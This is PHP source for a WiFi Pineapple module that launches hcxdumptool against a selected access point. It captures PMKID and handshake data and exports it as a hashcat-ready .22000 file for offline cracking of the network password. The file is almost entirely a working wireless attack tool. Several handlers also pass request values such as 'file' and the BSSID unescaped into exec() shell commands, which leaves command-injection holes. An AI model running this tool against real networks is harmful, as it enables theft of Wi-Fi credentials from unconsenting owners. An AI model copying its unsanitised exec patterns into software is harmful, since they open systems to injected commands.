<?php

namespace pineapple;

require_once("/pineapple/modules/PineAP/api/PineAPHelper.php");

class PMKIDAttack extends Module
{
    const MODULE_PATH = "/pineapple/modules/PMKIDAttack";
    const MODULE_SD_PATH = "/sd/modules/PMKIDAttack";
    const DUMPTOOL_PATH = "/usr/sbin/hcxdumptool";
    const DUMPTOOL_SD_PATH = "/sd/usr/sbin/hcxdumptool";
    const CAPTOOL_PATH = "/sbin/hcxpcapngtool";
    const CAPTOOL_SD_PATH = "/sd/sbin/hcxpcapngtool";

    private $pineAPHelper;
    private $moduleFolder;
    private $captureFolder;
    private $logPath;
    private $hcxdumptoolPath;
    private $hcxpcaptoolPath;

    public function __construct($request, $moduleClass)
    {
        parent::__construct($request, $moduleClass);

        $this->pineAPHelper = new PineAPHelper();
        $this->moduleFolder = $this->getPathModule();
        $this->captureFolder = "{$this->moduleFolder}/pcapng";
        $this->logPath = "{$this->moduleFolder}/log/module.log";
        $this->hcxdumptoolPath = $this->getDumpToolPath();
        $this->hcxpcaptoolPath = $this->getCapToolPath();
    }

    public function route()
    {
        switch ($this->request->action) {
            case "clearLog":
                $this->clearLog();
                break;
            case "getLog":
                $this->getLog();
                break;
            case "getDependenciesStatus":
                $this->getDependenciesStatus();
                break;
            case "managerDependencies":
                $this->managerDependencies();
                break;
            case "getDependenciesInstallStatus":
                $this->getDependenciesInstallStatus();
                break;
            case "startAttack":
                $this->startAttack();
                break;
            case "stopAttack":
                $this->stopAttack();
                break;
            case "catchPMKID":
                $this->catchPMKID();
                break;
            case "getPMKIDFiles":
                $this->getPMKIDFiles();
                break;
            case "downloadPMKID":
                $this->downloadPMKID();
                break;
            case "deletePMKID":
                $this->deletePMKID();
                break;
            case "viewAttackLog":
                $this->viewAttackLog();
                break;
            case "getStatusAttack":
                $this->getStatusAttack();
                break;
        }
    }

    protected function getPathModule()
    {
        if ($this->isSDAvailable()) {
            return self::MODULE_SD_PATH;
        }

        return self::MODULE_PATH;
    }

    protected function getDumpToolPath()
    {
        if ($this->isSDAvailable()) {
            return self::DUMPTOOL_SD_PATH;
        }

        return self::DUMPTOOL_PATH;
    }

    protected function getCapToolPath()
    {
        if ($this->isSDAvailable()) {
            return self::CAPTOOL_SD_PATH;
        }

        return self::CAPTOOL_PATH;
    }

    protected function clearLog()
    {
        exec("rm {$this->logPath}");
    }

    protected function getLog()
    {
        if (!file_exists($this->logPath)) {
            touch($this->logPath);
        }

        $this->response = array("moduleLog" => file_get_contents($this->logPath));
    }

    protected function addLog($massage)
    {
        file_put_contents($this->logPath, $this->formatLog($massage), FILE_APPEND);
    }

    protected function formatLog($massage)
    {
        return "[" . date("Y-m-d H:i:s") . "] {$massage}\n";
    }

    protected function getDependenciesStatus()
    {
        $response = array(
            "installed" => false,
            "install" => "Install",
            "installLabel" => "success",
            "processing" => false
        );

        if (file_exists("/tmp/PMKIDAttack.progress")) {
            $response["install"] = "Installing...";
            $response["installLabel"] = "warning";
            $response["processing"] = true;
        } else if ($this->checkDependencyInstalled()) {
            $response["install"] = "Remove";
            $response["installLabel"] = "danger";
            $response["installed"] = true;
        }

        $this->response = $response;
    }

    protected function checkDependencyInstalled()
    {      
        if ($this->uciGet("pmkidattack.@config[0].installed")) {
            return true; 
        }

        if ($this->checkDependency("hcxdumptool")) {
            $this->uciSet("pmkidattack.@config[0].installed", "1");
            return true; 
        }

        return false;
    }

    protected function managerDependencies()
    {
        $this->stopAttack();
        $action = $this->checkDependencyInstalled() ? "remove" : "install";
        $this->execBackground("{$this->moduleFolder}/scripts/dependencies.sh {$action}");
        $this->response = array("success" => true);
    }

    protected function getDependenciesInstallStatus()
    {
        $this->response = array("success" => !file_exists("/tmp/PMKIDAttack.progress"));
    }

    protected function startAttack()
    {
        $this->pineAPHelper->disablePineAP();

        //$this->execBackground("{$this->moduleFolder}/scripts/PMKIDAttack.sh start " . $this->request->bssid);
        $this->uciSet("pmkidattack.@config[0].ssid", $this->request->ssid);
        $this->uciSet("pmkidattack.@config[0].bssid", $this->request->bssid);
        $this->uciSet("pmkidattack.@config[0].attack", "1");

        $BSSID = $this->getBSSID(true);
        exec("echo {$BSSID} > {$this->moduleFolder}/scripts/filter.txt");
        $this->execBackground(
            "{$this->hcxdumptoolPath} " . 
            "-o /tmp/{$BSSID}.pcapng " .
            "-i wlan1mon " .
            "--filterlist_ap={$this->moduleFolder}/scripts/filter.txt " .
            "--filtermode=2 " .
            "--enable_status=1 &> /dev/null &"
        );

        $this->addLog("Start attack {$this->request->bssid}");
        $this->response = array("success" => true);
    }

    protected function stopAttack()
    {
        $BSSID = $this->getBSSID(true);
        $BSSIDFormatted = $this->getBSSID();

        //$this->execBackground("{$this->moduleFolder}/scripts/PMKIDAttack.sh stop");
        exec("/usr/bin/pkill hcxdumptool");
        if ($this->checkPMKID()) {
            $metadata = json_encode([
                'ssid' => $this->uciGet("pmkidattack.@config[0].ssid"),
                'bssid' => $BSSIDFormatted
            ]);
            file_put_contents("{$this->captureFolder}/{$BSSID}.data", $metadata);
            exec("cp /tmp/{$BSSID}.pcapng {$this->captureFolder}/");
        }
        exec("rm /tmp/{$BSSID}.pcapng /tmp/pmkid-output.txt");

        $this->uciSet("pmkidattack.@config[0].ssid", "");
        $this->uciSet("pmkidattack.@config[0].bssid", "");
        $this->uciSet("pmkidattack.@config[0].attack", "0");
        $this->addLog("Stop attack {$BSSIDFormatted}");

        $this->response = array("success" => true);
    }


    protected function catchPMKID()
    {
        $status = $this->checkPMKID();
        if ($status) {
            $this->addLog("PMKID " . $this->getBSSID() . " intercepted!");
        }

        $this->response = array(
            "success" => $status,
            "pmkidLog" => file_get_contents("/tmp/pmkid-output.txt"),
        );
    }

    protected function getBSSID($clean = false)
    {
        $bssid = $this->uciGet("pmkidattack.@config[0].bssid");

        return $clean ? str_replace(":", "", $bssid) : $bssid;
    }

    protected function checkPMKID()
    {
        $BSSID = $this->getBSSID(true);

        //exec("{$this->moduleFolder}/scripts/PMKIDAttack.sh check-bg " . $this->getBSSID(true));
        exec("{$this->hcxpcaptoolPath} -o /tmp/pmkid-handshake.tmp /tmp/{$BSSID}.pcapng &> /tmp/pmkid-output.txt");
        $file = file_get_contents("/tmp/pmkid-output.txt");
        exec("rm /tmp/pmkid-handshake.tmp");

        // tested on hcxpcaptool 6.0
        //return (strpos($file, " handshake(s) written to") !== false && strpos($file, "0 handshake(s) written to") === false);
        return strpos($file, "Information: no hashes written to hash files") === false;
    }

    protected function getPMKIDFiles()
    {
        $pmkids = [];
        foreach (glob("{$this->captureFolder}/*.pcapng") as $capture) {
            $file = basename($capture, ".pcapng");
            $metadata = file_get_contents("{$this->captureFolder}/{$file}.data");
            if ($metadata) {
                $captureMetadata = json_decode($metadata, true);
                $name = "{$captureMetadata['ssid']} ({$captureMetadata['bssid']})";
            } else {
                $name = implode(str_split($file, 2), ":");
            }

            $pmkids[] = [
                "file" => $file,
                "name" => $name
            ];
        }

        $this->response = array("pmkids" => $pmkids);
    }

    protected function downloadPMKID()
    {
        $file = $this->request->file;
        $workingDir = "/tmp/PMKIDAttack";

        exec("mkdir {$workingDir}");
        exec("cp {$this->captureFolder}/{$file}.pcapng {$workingDir}/");
        exec("{$this->hcxpcaptoolPath} -o {$workingDir}/pmkid.22000 {$workingDir}/{$file}.pcapng &> {$workingDir}/report.txt");
        exec("cd {$workingDir}/ && tar -czf /tmp/{$file}.tar.gz *");
        exec("rm -rf {$workingDir}/");

        $this->response = array("download" => $this->downloadFile("/tmp/{$file}.tar.gz"));
    }

    protected function deletePMKID()
    {
        $file = $this->request->file;
        exec("rm {$this->captureFolder}/{$file}.pcapng {$this->captureFolder}/{$file}.data");

        $this->response = array("success" => true);
    }

    protected function viewAttackLog()
    {
        $file = $this->request->file;
        if (!empty($file)) {
            exec("{$this->hcxpcaptoolPath} -o /tmp/pmkid-handshake.tmp {$this->captureFolder}/{$file}.pcapng &> /tmp/pmkid-old-output.txt");
            $pmkidLog = file_get_contents("/tmp/pmkid-old-output.txt");
            exec("rm /tmp/pmkid-old-output.txt");
        } else {
            $pmkidLog = file_get_contents("/tmp/pmkid-output.txt");
        }

        $this->response = array("pmkidLog" => $pmkidLog);
    }

    protected function getStatusAttack()
    {
        $this->response = array(
            "ssid" => $this->uciGet("pmkidattack.@config[0].ssid"),
            "bssid" => $this->uciGet("pmkidattack.@config[0].bssid"),
            "success" => $this->uciGet("pmkidattack.@config[0].attack") === true,
        );
    }
}
